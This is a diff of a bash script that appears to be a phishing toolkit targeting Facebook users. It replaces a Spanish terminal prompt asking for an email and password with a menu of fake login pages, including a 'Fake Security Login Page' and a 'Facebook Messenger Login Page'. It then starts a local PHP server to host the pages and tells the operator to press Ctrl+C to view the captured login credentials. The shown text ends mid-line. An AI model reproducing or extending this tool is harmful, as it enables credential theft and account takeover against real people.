@@ -219,24 +219,13 @@ fi
 }
 
 facebook(){
-    printf " \n"
-    printf " \e[1;34m[\e[0m\e[1;77mIniciar sesión\e[0m\e[1;34m]\e[0m\n"
-    printf " \e[1;34m[\e[0m\e[1;77msendbyemail\e[0m\e[1;34m]\e[0m\n"
-    printf " \n"
-    printf " \e[1;34mFacebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.\e[0m\n"
-    printf " \n"
-    printf " \e[1;33mCorreo electrónico o teléfono:\e[0m\n"
-    read -p " " email
-    printf " \e[1;33mContraseña:\e[0m\n"
-    read -sp " " password
-    printf " \n"
-    printf " \e[1;34m[\e[0m\e[1;77mIniciar sesión\e[0m\e[1;34m]\e[0m\n"
-    printf " \e[1;34m[\e[0m\e[1;77m¿Olvidaste tu contraseña?\e[0m\e[1;34m]\e[0m\n"
-    printf " \e[1;34m[\e[0m\e[1;77mCrear cuenta nueva\e[0m\e[1;34m]\e[0m\n"
-    printf " \n"
-    printf " \e[1;34mEditor\e[0m \e[1;34mFiles\e[0m \e[1;34mTerminal\e[0m\n"
-}
-
+printf " \n"
+printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login Page\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Advanced Voting Poll Login Page\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Fake Security Login Page\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m Facebook Messenger Login Page\e[0m\n"
+printf "\e[0m\n"
+read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' fb_option
 
 
 if [[ $fb_option == 1 || $fb_option == 01 ]]; then
@@ -561,4 +550,10 @@ printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching LocalHostRun ...\e[0m\n"
 cd .htr/www && php -S 127.0.0.1:4545 > /dev/null 2>&1 & 
 printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing.
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;91m ( \e[0m\e[1;96mhttp://127.0.0.1:4545\e[0m\e[1;91m )\e[0m\n"
+sleep 1
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Press Ctrl+C to View Login Creds \e[0m\n"
+sleep 1
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e
